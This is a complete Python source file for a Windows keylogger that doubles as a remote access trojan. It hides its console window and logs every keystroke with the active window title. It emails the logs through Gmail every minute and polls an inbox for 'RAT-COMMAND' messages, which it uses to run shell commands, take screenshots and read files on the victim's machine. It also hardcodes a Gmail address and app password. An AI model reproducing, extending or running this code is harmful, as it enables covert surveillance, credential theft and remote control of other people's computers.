from pynput.keyboard import Listener, Key
import os
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
import schedule
import threading
import time
import ctypes
import win32gui
import win32process
import psutil
import imaplib
import email
import subprocess
import shutil
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

log_file = "keylog.txt"
email_interval = 1  # in minutes

EMAIL_ADDRESS = "b18587695@gmail.com"
EMAIL_PASSWORD = "yajiunnsgxypwbvt"
TO_EMAIL = "b18587695@gmail.com"

sentence_buffer = ""
last_window = ""

def write_log(text):
    with open(log_file, "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("[%Y-%m-%d %I:%M %p] ")
        f.write(timestamp + text.strip() + "\n")

def flush_buffer():
    global sentence_buffer
    if sentence_buffer.strip():
        write_log(sentence_buffer)
        sentence_buffer = ""

def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        window_title = win32gui.GetWindowText(hwnd)
        return f"{process.name()} - {window_title}"
    except Exception as e:
        return "Unknown Window"

def on_press(key):
    global sentence_buffer, last_window
    try:
        current_window = get_active_window()
        if current_window != last_window:
            flush_buffer()
            write_log(f"\n\n[Window Changed] {current_window}\n")
            last_window = current_window

        if hasattr(key, 'char') and key.char is not None:
            sentence_buffer += key.char
            if key.char in [".", "!", "?"]:
                flush_buffer()
        else:
            if key == Key.space:
                sentence_buffer += " "
            elif key == Key.enter:
                flush_buffer()
                write_log("[ENTER]")
            elif key == Key.tab:
                sentence_buffer += "    "
            elif key == Key.backspace:
                sentence_buffer = sentence_buffer[:-1]
            else:
                sentence_buffer += f" [{key.name}] "
    except Exception:
        pass

def hide_window():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def send_email():
    try:
        with open(log_file, "r", encoding="utf-8") as f:
            content = f.read()
        if content.strip() == "":
            return
        msg = MIMEText(content)
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = TO_EMAIL

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        open(log_file, "w", encoding="utf-8").close()
    except Exception as e:
        pass

def schedule_email():
    schedule.every(email_interval).minutes.do(send_email)
    while True:
        schedule.run_pending()
        time.sleep(1)

def fetch_command():
    try:
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        mail.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        mail.select("inbox")
        status, response = mail.search(None, '(UNSEEN SUBJECT "RAT-COMMAND")')
        command = None
        for num in response[0].split():
            typ, msg_data = mail.fetch(num, '(RFC822)')
            for response_part in msg_data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_bytes(response_part[1])
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() == "text/plain":
                                command = part.get_payload(decode=True).decode()
                    else:
                        command = msg.get_payload(decode=True).decode()
            mail.store(num, '+FLAGS', '\\Seen')
        mail.logout()
        return command.strip() if command else None
    except Exception as e:
        return None

def take_screenshot():
    try:
        image = ImageGrab.grab()
        path = os.path.join(os.getcwd(), "screenshot.png")
        image.save(path)
        return path
    except Exception as e:
        return f"Screenshot failed: {e}"

def send_response(subject, body, attachment_path=None):
    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = TO_EMAIL
        msg["Subject"] = subject

        msg.attach(MIMEText(body, "plain"))
        if attachment_path and os.path.exists(attachment_path):
            part = MIMEBase("application", "octet-stream")
            with open(attachment_path, "rb") as f:
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(attachment_path)}")
            msg.attach(part)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception:
        pass

def execute_command(cmd):
    try:
        if cmd.startswith("run "):
            output = subprocess.getoutput(cmd[4:])
            return output
        elif cmd == "screenshot":
            return take_screenshot()
        elif cmd.startswith("readfile "):
            path = cmd[9:]
            if os.path.exists(path):
                with open(path, 'r', encoding="utf-8") as f:
                    return f.read()
            return "File not found."
        elif cmd.startswith("listdir "):
            path = cmd[8:]
            return "\n".join(os.listdir(path)) if os.path.exists(path) else "Directory not found."
        return "Unknown command."
    except Exception as e:
        return f"Error: {str(e)}"

def command_loop():
    while True:
        cmd = fetch_command()
        if cmd:
            result = execute_command(cmd)
            if isinstance(result, str) and result.endswith(".png"):
                send_response("RAT Result", "Screenshot attached.", result)
            else:
                send_response("RAT Result", result)
        time.sleep(60)

# Main Execution
hide_window()
threading.Thread(target=schedule_email, daemon=True).start()
threading.Thread(target=command_loop, daemon=True).start()

with Listener(on_press=on_press) as listener:
    listener.join()
